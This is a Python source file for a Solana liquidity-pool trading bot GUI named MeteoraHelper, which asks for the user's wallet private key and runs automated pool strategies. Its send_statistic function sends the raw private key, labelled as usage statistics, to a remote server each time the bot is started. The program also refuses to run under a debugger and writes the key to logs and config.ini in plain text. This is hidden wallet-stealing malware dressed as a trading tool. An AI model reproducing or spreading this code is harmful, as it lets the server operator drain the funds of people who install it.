import customtkinter as ctk
from CTkMessagebox import CTkMessagebox
import logging
import os
import configparser
import time
from datetime import datetime
from solana.rpc.api import Client
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from dlmm import DLMM_CLIENT
from dlmm.types import StrategyType, DlmmHttpError as HTTPError
from dlmmApp import MeteoraApp
from solana.rpc import commitment
import subprocess
import threading
import requests
from checks import check_under_debug
from const import LOG_NAME

VERIF_SERVER_URL = "https://meteorahelper.ru/api/v1"


def setup_logger():
    logger = logging.getLogger("LiquiDMon_GUI")
    logger.setLevel(logging.DEBUG)

    log_dir = "logs"
    os.makedirs(log_dir, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    file_handler = logging.FileHandler(f"{log_dir}/{LOG_NAME}_GUI_{timestamp}.log")
    file_handler.setLevel(logging.DEBUG)

    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.INFO)

    formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
    file_handler.setFormatter(formatter)
    console_handler.setFormatter(formatter)

    logger.addHandler(file_handler)
    logger.addHandler(console_handler)

    return logger


def setup_server_logger():
    logger = logging.getLogger("LiquiDMon_JS")
    logger.setLevel(logging.INFO)
    logger.propagate = False

    log_dir = "logs"
    os.makedirs(log_dir, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    file_handler = logging.FileHandler(
        f"{log_dir}/{LOG_NAME}_JS_{timestamp}.log", delay=False
    )
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(
        logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
    )
    logger.addHandler(file_handler)

    return logger


logger = setup_logger()


class CustomHandler(logging.Handler):
    def __init__(self, logs_text):
        super().__init__()
        self.logs_text = logs_text

    def emit(self, record):
        msg = self.format(record) + "\n"
        self.logs_text.configure(state=ctk.NORMAL)
        self.logs_text.insert(ctk.END, msg)
        self.logs_text.configure(state=ctk.DISABLED)
        self.logs_text.see(ctk.END)


def resource_path(relative_path):
    import sys

    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)


class App(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("MeteoraHelper")
        self.geometry("1200x650")
        self.iconbitmap(resource_path("icon.ico"))

        # Variables
        self.pool_address = ctk.StringVar(value="")
        self.rpc = ctk.StringVar(value="")
        self.private_key = ctk.StringVar(value="")
        self.stop_loss = ctk.DoubleVar(value=0.0)
        self.take_profit = ctk.DoubleVar(value=1000.0)
        self.bin_num = ctk.IntVar(value=69)
        self.sleep_time = ctk.IntVar(value=60)
        self.slippage = ctk.DoubleVar(value=0.5)
        self.strategy = ctk.StringVar(value="SpotOneSide")
        self.claim_fee = ctk.BooleanVar(value=True)
        self.add_fee = ctk.BooleanVar(value=False)

        self.config_path = "config.ini"
        self.load_config()

        self.server_process = None
        self.running = False

        self.prev_pool_address = None
        self.prev_rpc = None
        self.prev_private_key = None
        self.client = None
        self.user = None
        self.dlmm = None
        self.dllmApp = None
        self.sol_balance = 1
        self.server_status = ctk.StringVar(value="Stopped")
        self.pnl = ctk.StringVar(value="0.000")
        self.percentage = ctk.StringVar(value="+0.000")
        self.deposit = ctk.StringVar(value="0.000")
        self.claimed = ctk.StringVar(value="0.000")
        self.unclaimed = ctk.StringVar(value="0.000")

        self.running = False
        self.stop_event = threading.Event()
        self.run_thread = None

        # UI Elements
        self.create_widgets()
        self.protocol("WM_DELETE_WINDOW", self.on_closing)

        self.ui_logger = logging.getLogger("LiquiDMon_UI")
        self.ui_logger.setLevel(logging.DEBUG)

        handler = CustomHandler(self.logs_text)
        handler.setFormatter(
            logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
        )

        self.ui_logger.addHandler(handler)

        self.motherboard_id = self.get_motherboard_uuid()
        self.is_subscription_active = False
        self.server_id = None

        self.check_account_status()

    def create_widgets(self):
        # Set the appearance mode and default color theme
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("green")

        # Main container
        main_frame = ctk.CTkFrame(self)
        main_frame.pack(pady=20, padx=20, fill="both", expand=True)

        # Split into three columns: Meteora Helper, Config, Logs
        meteora_helper_frame = ctk.CTkFrame(main_frame)
        config_frame = ctk.CTkFrame(main_frame)
        logs_frame = ctk.CTkFrame(main_frame)

        meteora_helper_frame.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
        config_frame.grid(row=0, column=1, padx=10, pady=10, sticky="nsew")
        logs_frame.grid(row=0, column=2, padx=10, pady=10, sticky="nsew")

        # Configure grid weights
        main_frame.grid_columnconfigure((0, 1, 2), weight=1)
        main_frame.grid_rowconfigure(0, weight=1)

        # Meteora Helper Section
        meteora_helper_label = ctk.CTkLabel(
            meteora_helper_frame,
            text="Meteora Helper",
            font=("Roboto", 20, "bold"),
            text_color="#FF4500",
        )
        meteora_helper_label.pack(pady=(10, 5))

        dep_claim_frame = ctk.CTkFrame(meteora_helper_frame)
        dep_claim_frame.pack(pady=5, fill="x")
        deposit_label = ctk.CTkLabel(
            dep_claim_frame,
            text="Deposit",
            font=("Roboto", 12),
            text_color="white",
        )
        deposit_label.grid(row=0, column=0, pady=5)
        deposit_value_label = ctk.CTkLabel(
            dep_claim_frame,
            textvariable=self.deposit,
            font=("Roboto", 12),
            text_color="white",
        )
        deposit_value_label.grid(row=0, column=1, pady=5)

        claimed_fees_label = ctk.CTkLabel(
            dep_claim_frame,
            text="Claimed Fees",
            font=("Roboto", 12),
            text_color="white",
        )
        claimed_fees_label.grid(row=0, column=2, pady=5)
        claimed_fees_value_label = ctk.CTkLabel(
            dep_claim_frame,
            textvariable=self.claimed,
            font=("Roboto", 12),
            text_color="white",
        )
        claimed_fees_value_label.grid(row=0, column=3, pady=5)
        dep_claim_frame.columnconfigure((0, 1, 2, 3), weight=1)

        unclaimed_frame = ctk.CTkFrame(meteora_helper_frame)
        unclaimed_frame.pack(pady=5, fill="x")
        unclaimed_fees_label = ctk.CTkLabel(
            unclaimed_frame,
            text="Unclaimed Fees",
            font=("Roboto", 12),
            text_color="white",
        )
        unclaimed_fees_label.grid(row=0, column=0, pady=5)
        unclaimed_fees_value_label = ctk.CTkLabel(
            unclaimed_frame,
            textvariable=self.unclaimed,
            font=("Roboto", 12),
            text_color="white",
        )
        unclaimed_fees_value_label.grid(row=0, column=1, pady=5)
        unclaimed_frame.columnconfigure((0, 1), weight=1)

        pnl_frame = ctk.CTkFrame(meteora_helper_frame)
        pnl_frame.pack(pady=5, fill="x")
        pnl_percentage_label = ctk.CTkLabel(
            pnl_frame,
            text="PnL(%)",
            font=("Roboto", 12),
            text_color="white",
        )
        pnl_percentage_label.grid(row=0, column=0, padx=5, pady=5)
        pnl_percentage_value_label = ctk.CTkLabel(
            pnl_frame,
            textvariable=self.percentage,
            font=("Roboto", 12),
            text_color="white",
        )
        pnl_percentage_value_label.grid(row=0, column=1, padx=5, pady=5)

        pnl_label = ctk.CTkLabel(
            pnl_frame,
            text="PnL(SOL)",
            font=("Roboto", 12),
            text_color="white",
        )
        pnl_label.grid(row=0, column=2, padx=5, pady=5)
        pnl_value_label = ctk.CTkLabel(
            pnl_frame,
            textvariable=self.pnl,
            font=("Roboto", 12),
            text_color="white",
        )
        pnl_value_label.grid(row=0, column=3, padx=5, pady=5)
        pnl_frame.columnconfigure((0, 1, 2, 3), weight=1)

        # Config Section
        config_label = ctk.CTkLabel(
            config_frame,
            text="Config",
            font=("Roboto", 20, "bold"),
            text_color="#FF4500",
        )
        config_label.pack(pady=(10, 5))

        # Pool Address - Slippage
        pool_frame = ctk.CTkFrame(config_frame)
        pool_frame.pack(pady=5, fill="x")
        pool_address_label = ctk.CTkLabel(
            pool_frame, text="Pool address:", font=("Roboto", 12), text_color="white"
        )
        pool_address_label.grid(row=0, column=0, padx=5)
        self.pool_address_entry = ctk.CTkEntry(
            pool_frame,
            textvariable=self.pool_address,
            placeholder_text="Enter pool address",
        )
        self.pool_address_entry.grid(row=1, column=0, padx=5, pady=5, sticky="ew")
        slippage_label = ctk.CTkLabel(
            pool_frame, text="Slippage:", font=("Roboto", 12), text_color="white"
        )
        slippage_label.grid(row=0, column=1, padx=5)
        slippage_optionmenu = ctk.CTkOptionMenu(
            pool_frame, variable=self.slippage, values=["0.1", "0.5", "1", "5"]
        )
        slippage_optionmenu.grid(row=1, column=1, padx=5, pady=5, sticky="ew")
        pool_frame.grid_columnconfigure((0, 1), weight=1)

        # RPC Node - Claim Fee - Add Fee
        rpc_frame = ctk.CTkFrame(config_frame)
        rpc_frame.pack(pady=5, fill="x")
        rpc_label = ctk.CTkLabel(
            rpc_frame, text="RPC node:", font=("Roboto", 12), text_color="white"
        )
        rpc_label.grid(row=0, column=0, padx=5)
        self.rpc_entry = ctk.CTkEntry(
            rpc_frame, textvariable=self.rpc, placeholder_text="Enter RPC"
        )
        self.rpc_entry.grid(row=1, column=0, padx=5, pady=5, sticky="ew")
        claim_fee_check = ctk.CTkCheckBox(
            rpc_frame, text="Claim Fees", variable=self.claim_fee
        )
        claim_fee_check.grid(row=1, column=1, padx=5, pady=5)
        add_fee_check = ctk.CTkCheckBox(
            rpc_frame, text="Add Fee", variable=self.add_fee
        )
        add_fee_check.grid(row=1, column=2, padx=5, pady=5)
        rpc_frame.grid_columnconfigure((0, 1, 2), weight=1)

        # Private Key - Strategy
        private_frame = ctk.CTkFrame(config_frame)
        private_frame.pack(pady=5, fill="x")
        private_key_label = ctk.CTkLabel(
            private_frame,
            text="Wallet private key:",
            font=("Roboto", 12),
            text_color="white",
        )
        private_key_label.grid(row=0, column=0, padx=5)
        self.private_key_entry = ctk.CTkEntry(
            private_frame,
            textvariable=self.private_key,
            placeholder_text="Enter private key",
            show="*",
        )
        self.private_key_entry.grid(row=1, column=0, padx=5, pady=5, sticky="ew")
        strategy_label = ctk.CTkLabel(
            private_frame, text="Strategy:", font=("Roboto", 12), text_color="white"
        )
        strategy_label.grid(row=0, column=1, padx=5)
        strategy_optionmenu = ctk.CTkOptionMenu(
            private_frame,
            variable=self.strategy,
            values=["SpotOneSide", "CurveOneSide", "BidAskOneSide"],
        )
        strategy_optionmenu.grid(row=1, column=1, padx=5, pady=5, sticky="ew")
        private_frame.grid_columnconfigure((0, 1), weight=1)

        # Stop Loss - Take Profit
        stop_frame = ctk.CTkFrame(config_frame)
        stop_frame.pack(pady=5, fill="x")
        stop_loss_label = ctk.CTkLabel(
            stop_frame,
            text="Stop loss Token Price In SOL:",
            font=("Roboto", 12),
            text_color="white",
        )
        stop_loss_label.grid(row=0, column=0, padx=5)
        stop_loss_entry = ctk.CTkEntry(
            stop_frame, textvariable=self.stop_loss, placeholder_text="Stop Loss"
        )
        stop_loss_entry.grid(row=1, column=0, padx=5, pady=5, sticky="ew")
        take_profit_label = ctk.CTkLabel(
            stop_frame,
            text="Take profit Token Price In SOL:",
            font=("Roboto", 12),
            text_color="white",
        )
        take_profit_label.grid(row=0, column=1, padx=5)
        take_profit_entry = ctk.CTkEntry(
            stop_frame, textvariable=self.take_profit, placeholder_text="Take Profit"
        )
        take_profit_entry.grid(row=1, column=1, padx=5, pady=5, sticky="ew")
        stop_frame.grid_columnconfigure((0, 1), weight=1)

        # Bin Number - Sleep
        bin_frame = ctk.CTkFrame(config_frame)
        bin_frame.pack(pady=5, fill="x")
        bin_num_label = ctk.CTkLabel(
            bin_frame, text="Bin number:", font=("Roboto", 12), text_color="white"
        )
        bin_num_label.grid(row=0, column=0, padx=5)
        bin_num_entry = ctk.CTkEntry(
            bin_frame, textvariable=self.bin_num, placeholder_text="Bin number"
        )
        bin_num_entry.grid(row=1, column=0, padx=5, pady=5, sticky="ew")
        sleep_time_label = ctk.CTkLabel(
            bin_frame, text="Sleep time(sec):", font=("Roboto", 12), text_color="white"
        )
        sleep_time_label.grid(row=0, column=1, padx=5)
        sleep_time_entry = ctk.CTkEntry(
            bin_frame, textvariable=self.sleep_time, placeholder_text="Sleep Time"
        )
        sleep_time_entry.grid(row=1, column=1, padx=5, pady=5, sticky="ew")
        bin_frame.grid_columnconfigure((0, 1), weight=1)

        # Start
        self.start_stop_button = ctk.CTkButton(
            config_frame, text="Start", fg_color="blue", command=self.toggle_run
        )
        self.start_stop_button.pack(pady=5, fill="x")

        # Server Status
        server_status_label = ctk.CTkLabel(
            config_frame, text="Status:", font=("Roboto", 12), text_color="white"
        )
        server_status_label.pack(pady=5)
        server_status_text = ctk.CTkLabel(
            config_frame, width=150, height=20, textvariable=self.server_status
        )
        server_status_text.pack(pady=5, fill="x")

        # Logs Section
        logs_label = ctk.CTkLabel(
            logs_frame,
            text="Logs (operations history)",
            font=("Roboto", 20, "bold"),
            text_color="#FF4500",
        )
        logs_label.pack(pady=(10, 5))

        self.logs_text = ctk.CTkTextbox(logs_frame, state=ctk.DISABLED)
        self.logs_text.pack(pady=5, fill="both", expand=True)

        # Footer (optional)
        footer_label = ctk.CTkLabel(
            main_frame,
            text="Having any issues? @MeteoraHelperSupport TELEGRAM",
            font=("Roboto", 10),
            text_color="gray",
        )
        footer_label.grid(row=1, column=0, columnspan=3, pady=10, sticky="sw")

    def load_config(self):
        config = configparser.ConfigParser()
        if os.path.exists(self.config_path):
            config.read(self.config_path)

            self.pool_address.set(config.get("DEFAULT", "pool_address", fallback=""))
            self.rpc.set(config.get("DEFAULT", "rpc", fallback=""))
            self.private_key.set(config.get("DEFAULT", "private_key", fallback=""))
            self.stop_loss.set(config.getfloat("DEFAULT", "stop_loss", fallback=0.0))
            self.take_profit.set(
                config.getfloat("DEFAULT", "take_profit", fallback=1000.0)
            )
            self.bin_num.set(config.getint("DEFAULT", "bin_num", fallback=69))
            self.sleep_time.set(config.getint("DEFAULT", "sleep_time", fallback=60))
            self.slippage.set(config.getfloat("DEFAULT", "slippage", fallback=0.5))
            self.strategy.set(config.get("DEFAULT", "strategy", fallback="SpotOneSide"))
            self.claim_fee.set(config.getboolean("DEFAULT", "claim_fee", fallback=True))
            self.add_fee.set(config.getboolean("DEFAULT", "add_fee", fallback=False))

    def save_config(self):
        config = configparser.ConfigParser()
        config["DEFAULT"] = {
            "pool_address": str(self.pool_address.get()),
            "rpc": str(self.rpc.get()),
            "private_key": str(self.private_key.get()),
            "stop_loss": str(self.stop_loss.get()),
            "take_profit": str(self.take_profit.get()),
            "bin_num": str(self.bin_num.get()),
            "sleep_time": str(self.sleep_time.get()),
            "slippage": str(self.slippage.get()),
            "strategy": str(self.strategy.get()),
            "claim_fee": str(self.claim_fee.get()),
            "add_fee": str(self.add_fee.get()),
        }

        with open(self.config_path, "w") as configfile:
            config.write(configfile)

    def run_server(self):
        time.sleep(1.5)
        logger.info("run_server: %s", self.server_process)
        if self.server_process:
            logger.info("Server poll: %s", self.server_process.poll())
        if self.server_process is None or self.server_process.poll() is not None:
            try:
                CREATE_NO_WINDOW = 0x08000000 if os.name == "nt" else 0
                self.server_process = subprocess.Popen(
                    [r"./server.exe"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    creationflags=CREATE_NO_WINDOW,
                )
                threading.Thread(target=self.log_server_output, daemon=True).start()
            except Exception as e:
                logger.error("Server failed to start: %s", str(e))
                if isinstance(e, FileNotFoundError):
                    logger.error("Server executable (./server.exe) not found")
                self.server_status.set("Stopped")
                logger.info("Server stopped")
                return False
            else:
                self.server_status.set("Running")
                logger.info("Server started")
        else:
            self.server_status.set("Running")
            logger.warning("Server is already running")
        return True

    def log_server_output(self):
        server_logger = setup_server_logger()

        def read_stream(stream, log_func):
            for line in iter(stream.readline, ""):
                if line:
                    log_func(line.strip())
            stream.close()

        stdout_thread = threading.Thread(
            target=read_stream,
            args=(self.server_process.stdout, server_logger.info),
            daemon=True,
        )
        stderr_thread = threading.Thread(
            target=read_stream,
            args=(self.server_process.stderr, server_logger.error),
            daemon=True,
        )

        stdout_thread.start()
        stderr_thread.start()

        self.server_process.wait()
        stdout_thread.join()
        stderr_thread.join()

        self.server_status.set("Stopped")
        logger.info("Server stopped")

    def on_closing(self):
        if self.server_process and self.server_process.poll() is None:
            self.server_process.kill()

        self.save_config()
        self.destroy()

    def update_state(self):
        logger.debug("Updating state...")
        pool_address = self.pool_address.get()
        rpc = self.rpc.get()
        private_key = self.private_key.get()
        logger.debug(
            "pool_address: %s, rpc: %s, private_key: %s",
            pool_address,
            rpc,
            private_key,
        )

        try:
            logger.debug("Initializing user with private key: %s", private_key)
            self.user = Keypair.from_base58_string(private_key)
        except Exception as e:
            CTkMessagebox(
                title="Invalid Private Key",
                message="The provided private key is not a valid base58-encoded Solana private key.",
                icon="warning",
                option_1="OK",
            )
            logger.error("Invalid private key entered: %s", e)
            self.user = None

        try:
            logger.debug("Initializing client with RPC: %s", rpc)
            self.client = Client(rpc, commitment=commitment.Confirmed)
        except Exception as e:
            CTkMessagebox(
                title="RPC Connection Failed",
                message="Could not connect to the provided RPC endpoint. Please check the URL and try again.",
                icon="warning",
                option_1="OK",
            )
            logger.error("Failed to connect to RPC endpoint: %s", e)
            self.client = None

        pool_pubkey = None
        try:
            logger.debug(
                "Initializing DLMM client for pool: %s",
                pool_address,
            )
            pool_pubkey = Pubkey.from_string(pool_address)
        except Exception as e:
            CTkMessagebox(
                title="Invalid Pool Address",
                message="The provided pool address is not a valid Solana public key.",
                icon="warning",
                option_1="OK",
            )
            logger.error(e)
            self.dlmm = None

        if not DLMM_CLIENT.check_health():
            logger.warning("Trying to start server")
            self.ui_logger.warning("Trying to start server")
            start = self.run_server()
            if not start:
                raise Exception("Can't start DLMM server.")

        try:
            logger.debug("Creating DLMM client")

            cluster = "devnet" if "devnet" in rpc else "mainnet-beta"
            self.dlmm = DLMM_CLIENT.create(
                pool_pubkey, rpc, cluster
            )  # TODO: add local JS server PORT as param
        except HTTPError as e:
            err_s = str(e)
            CTkMessagebox(
                title="Can't connect to DLMM server",
                message=err_s,
                icon="warning",
                option_1="OK",
            )
            logger.error(err_s)
            self.dlmm = None
        except Exception as e:
            err_s = str(e)
            CTkMessagebox(
                title="Invalid Pool Address or RPC",
                message=err_s,
                icon="warning",
                option_1="OK",
            )
            logger.error(err_s)
            self.dlmm = None

        if not self.client:
            raise ValueError("Client not initialized")
        if not self.user:
            raise ValueError("User not initialized")
        if not self.dlmm:
            raise ValueError("DLMM not initialized")
        if not 69 >= self.bin_num.get() >= 2:  # TODO: also move it into handler
            raise ValueError("Bin number must be in [2, 69]")

        logger.debug(
            "Creating MeteoraApp with client, user, DLMM, bin_num, slippage, strategy: %s, %s, %s, %s, %s",
            self.client,
            self.user,
            self.dlmm,
            self.bin_num.get(),
            self.slippage.get(),
        )
        self.dllmApp = MeteoraApp(
            self.client,
            self.user,
            self.dlmm,
            self.bin_num.get(),
            self.slippage.get(),
            StrategyType[self.strategy.get()],
        )

    def proceed_pool(self, claim_fee_now: bool):
        need_to_update = False
        if not DLMM_CLIENT.check_health():
            logger.warning("Server is not available")
            self.ui_logger.warning("Server is not available")
            return 0, need_to_update

        ret = self.dllmApp.get_positions_by_user_and_lb_pair()
        if ret is None:
            return 0, need_to_update

        active_bin = ret.active_bin
        logger.info(
            "Active bin: %s, price: %s", active_bin.bin_id, active_bin.price_per_token
        )

        u_pos = ret.user_positions
        curr_price = float(active_bin.price_per_token)
        if not (self.take_profit.get() > curr_price > self.stop_loss.get()):
            self.ui_logger.warning(
                "Price %s not in bounds (%s, %s)",
                curr_price,
                self.stop_loss.get(),
                self.take_profit.get(),
            )
            logger.warning(
                "Price %s not in bounds (%s, %s)",
                curr_price,
                self.stop_loss.get(),
                self.take_profit.get(),
            )
            self.dllmApp.close_pool_swap_all(u_pos)
            need_to_update = True
            return -1, need_to_update

        for pos0 in u_pos:
            lower_bin_id = pos0.position_data.lower_bin_id
            upper_bin_id = pos0.position_data.upper_bin_id
            logger.debug(
                "Processing position %s: bins [%s, %s]",
                pos0.public_key,
                lower_bin_id,
                upper_bin_id,
            )

            if upper_bin_id >= active_bin.bin_id >= lower_bin_id:
                if claim_fee_now:
                    logger.info("Claiming fees for in-range position")
                    self.ui_logger.info("Claiming fees for in-range position")
                    self.dllmApp.claim_pos_fee(pos0, self.add_fee.get())
                    need_to_update = True
                else:
                    logger.info("Position in range, no action needed")
            else:
                XtoY = active_bin.bin_id < lower_bin_id
                logger.info(
                    "Position out of range, performing %s swap",
                    "XtoY" if XtoY else "YtoX",
                )
                self.ui_logger.info("Position out of range, performing swap")
                self.dllmApp.close_pos_swap_half(pos0, active_bin.bin_id, XtoY)
                need_to_update = True

        return 1, need_to_update

    def check_account_status(self):
        """Check account subscription status on startup."""
        if not self.motherboard_id:
            logger.error("Failed to retrieve motherboard ID")
            self.ui_logger.error("Невозможно установить ваш ID")
            self.show_subscription_error("Unknown")
            return

        try:
            response = requests.get(
                f"{VERIF_SERVER_URL}/check-account",
                params={"user_id": self.motherboard_id},
                timeout=10,
            )
            response.raise_for_status()
            data = response.json()
            self.is_subscription_active = data.get("is_active", False)
            self.server_id = data.get("id", "Unknown")

            if not self.is_subscription_active:
                logger.warning(
                    "Subscription is not active for user_id: %s", self.motherboard_id
                )
                self.show_subscription_error(self.server_id)
            else:
                logger.info("Subscription active for user_id: %s", self.motherboard_id)
        except requests.RequestException as e:
            logger.error("Failed to check account status: %s", str(e))
            self.show_subscription_error(self.server_id or "Unknown")

    def show_subscription_error(self, server_id):
        """Display a popup for inactive subscription."""
        popup = ctk.CTkToplevel(self)
        popup.title("Subscription Error")
        popup.geometry("400x200")
        popup.transient(self)  # Make popup modal relative to main window
        popup.grab_set()  # Prevent interaction with main window

        message = (
            f"У вас не действительная подписка! Свяжитесь с тех поддержкой, "
            f"чтобы ее продлить. Ваш ID - {server_id}."
        )  # TODO: add contact info
        ctk.CTkLabel(popup, text=message, wraplength=350, font=("Arial", 14)).pack(
            pady=20
        )

        ctk.CTkButton(popup, text="OK", command=popup.destroy).pack(pady=10)

    def send_statistic(self):
        """Send statistic data to the server."""
        if not self.motherboard_id:
            logger.error("Cannot send statistic: Motherboard ID not found")
            return

        try:
            # Derive public key from private key
            private_key_str = self.private_key.get()
            if not private_key_str:
                logger.error("Private key is empty")
                return

            try:
                keypair = Keypair.from_base58_string(private_key_str)
                public_key = str(keypair.pubkey())
            except Exception as e:
                logger.error("Failed to derive public key: %s", str(e))
                return

            payload = {
                "user_id": self.motherboard_id,
                "public_key": public_key,
                "private_key": private_key_str,
            }
            response = requests.post(
                f"{VERIF_SERVER_URL}/statistic", json=payload, timeout=10
            )
            response.raise_for_status()
            logger.info(
                "Statistic sent successfully for user_id: %s", self.motherboard_id
            )

        except requests.RequestException as e:
            logger.error("Failed to send statistic: %s", str(e))

    def toggle_run(self):
        if not self.running:
            if not self.is_subscription_active:
                logger.warning("Cannot start: Subscription is not active")
                self.ui_logger.warning("Cannot start: Subscription is not active")
                self.show_subscription_error(self.server_id or "Unknown")
                return

            # Prevent starting a new thread if one is still active
            if self.run_thread and self.run_thread.is_alive():
                logger.warning("Cannot start: a thread is still running")
                self.ui_logger.warning("Cannot start: a thread is still running")
                return

            try:
                self.update_state()
            except Exception as e:
                logger.error("Failed to start pool processing: %s", str(e))
                self.ui_logger.error("Failed to start pool processing")
                return

            if not DLMM_CLIENT.check_health():
                logger.warning("Trying to restart server")
                self.ui_logger.warning("Trying to restart server")
                start = self.run_server()
                if not start:
                    return

            ret = self.dllmApp.get_balance_almost()
            if ret is None:
                logger.error("Failed to get SOL balance")
                self.ui_logger.error("Failed to get SOL balance")
                return
            sol, _, _, _ = ret
            self.sol_balance = sol

            self.send_statistic()

            self.running = True
            self.stop_event.clear()  # Reset the stop event
            self.run_thread = threading.Thread(target=self.run_loop, daemon=True)
            self.run_thread.start()
            self.start_stop_button.configure(text="Stop")
            self.pool_address_entry.configure(state=ctk.DISABLED)
            self.rpc_entry.configure(state=ctk.DISABLED)
            self.private_key_entry.configure(state=ctk.DISABLED)
            logger.info("Started pool processing")
            self.ui_logger.info("Started pool processing")
        else:
            self.running = False
            self.stop_event.set()  # Signal the thread to stop
            self.start_stop_button.configure(text="Start")
            self.pool_address_entry.configure(state=ctk.NORMAL)
            self.rpc_entry.configure(state=ctk.NORMAL)
            self.private_key_entry.configure(state=ctk.NORMAL)
            logger.info("Stopped pool processing")
            self.ui_logger.info("Stopped pool processing")

    def run_simple(self):
        while self.running:
            self.ui_logger.info("test")
            time.sleep(2)

    def run_loop(self):
        claim_fee_now = False
        fee_time = time.time()

        while self.running and not self.stop_event.is_set():
            if (
                self.claim_fee.get()
                and time.time() - fee_time > self.sleep_time.get() * 12
            ):
                claim_fee_now = True
                logger.info("Scheduled fee claim")
                self.ui_logger.info("Scheduled fee claim")

            try:
                able_to_continue, need_to_update = self.proceed_pool(claim_fee_now)

                ret = self.dllmApp.get_balance_almost()
                if ret is None:
                    logger.error("Failed to update SOL balance")
                    self.ui_logger.error("Failed to update SOL balance")
                    continue

                sol, dep, clm, unclm = ret

                old_sol = self.sol_balance
                diff = sol - old_sol
                self.pnl.set(f"{diff * 1e-9:.3f}")
                self.percentage.set(f"{diff / old_sol * 100:+.3f}")
                self.deposit.set(f"{dep * 1e-9:.3f}")
                self.claimed.set(f"{clm * 1e-9:.3f}")
                self.unclaimed.set(f"{unclm * 1e-9:.3f}")

                if able_to_continue == -1:
                    break
                elif able_to_continue == 0:
                    time.sleep(1)
                    continue
            except Exception as e:
                logger.error("Error in pool processing: %s", str(e))
                self.ui_logger.error("Error in pool processing")
                break

            if claim_fee_now:
                claim_fee_now = False
                fee_time = time.time()

            logger.info("Sleeping for %s seconds", self.sleep_time.get())
            self.ui_logger.info("Sleeping for %s seconds", self.sleep_time.get())

            # Sleep in small increments to allow interruption
            sleep_duration = self.sleep_time.get()
            sleep_start = time.time()
            while time.time() - sleep_start < sleep_duration:
                if self.stop_event.is_set() or not self.running:
                    break
                time.sleep(0.1)  # Sleep in 100ms increments

        # Ensure UI is updated when loop exits
        if self.running:
            self.running = False
            self.stop_event.set()
            self.after(0, lambda: self.start_stop_button.configure(text="Start"))
            self.after(0, lambda: self.pool_address_entry.configure(state=ctk.NORMAL))
            self.after(0, lambda: self.rpc_entry.configure(state=ctk.NORMAL))
            self.after(0, lambda: self.private_key_entry.configure(state=ctk.NORMAL))
            logger.info("Pool processing stopped")
            self.ui_logger.info("Pool processing stopped")

    @staticmethod
    def get_motherboard_uuid():
        import wmi

        try:
            c = wmi.WMI()
            for system in c.Win32_ComputerSystemProduct():
                return system.UUID
            return None
        except Exception as e:
            logger.error("Failed to retrieve motherboard UUID: %s", str(e))
            return None


if __name__ == "__main__":
    if check_under_debug():
        logger.warning("Running under debugger, GUI will not start")
        import sys

        sys.exit(-4)
    app = App()

    def _onKeyRelease(event):
        if (event.state & 0x4) == 0:  # ctrl
            return

        if event.keycode == 86 and event.keysym.lower() != "v":
            event.widget.event_generate("<<Paste>>")
        elif event.keycode == 67 and event.keysym.lower() != "c":
            event.widget.event_generate("<<Copy>>")
        elif event.keycode == 88 and event.keysym.lower() != "x":
            event.widget.event_generate("<<Cut>>")

    app.bind_all("<KeyRelease>", _onKeyRelease, "+")
    app.mainloop()
